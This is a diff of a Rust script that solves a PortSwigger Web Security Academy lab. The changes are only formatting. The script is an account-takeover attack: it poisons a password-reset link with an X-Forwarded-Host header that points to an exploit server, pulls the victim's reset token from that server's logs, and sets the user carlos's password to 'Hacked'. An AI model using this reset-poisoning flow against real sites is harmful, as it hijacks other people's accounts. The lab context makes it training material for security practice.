@@ -37,39 +37,39 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0afb0047032e465684620f2100010005.web-security-academy.net"; 
-    
+    let url = "https://0afb0047032e465684620f2100010005.web-security-academy.net";
+
     // change this to your exploit server URL
-    let exploit_server_domain = "exploit-0a4800b90333461a84740e2f016000b2.exploit-server.net"; 
-    
+    let exploit_server_domain = "exploit-0a4800b90333461a84740e2f016000b2.exploit-server.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
     // set the new password
     // change thin to what you want
-    let new_password = "Hacked"; 
-    
+    let new_password = "Hacked";
+
     // change the dynamically-generating link via X-Forwarded-Host
-    let is_changed = change_dynamically_generated_link(&client, url, exploit_server_domain); 
-    
+    let is_changed = change_dynamically_generated_link(&client, url, exploit_server_domain);
+
     // if you changed the link successfully
     if is_changed {
         // try to extract the token from the your server logs
-        let some_token = extract_token_from_logs(&client, exploit_server_domain); 
+        let some_token = extract_token_from_logs(&client, exploit_server_domain);
 
         // if the extraction is successful and you found the token
         if let Some(token) = some_token {
             println!("{}", token);
-            
+
             // try to change the password with the obtained token
-            let password_change = change_password(&client, url, &token, new_password); 
-            
+            let password_change = change_password(&client, url, &token, new_password);
+
             // if password is changed successfully
             if let Ok(res) = password_change {
                 println!(
                     "{}",
                     "3. Changing the password of the carlos.. OK".white().bold()
-                )
+                );
                 println!(
                     "{}: {}",
                     "✅ Password changed to".yellow().bold(),
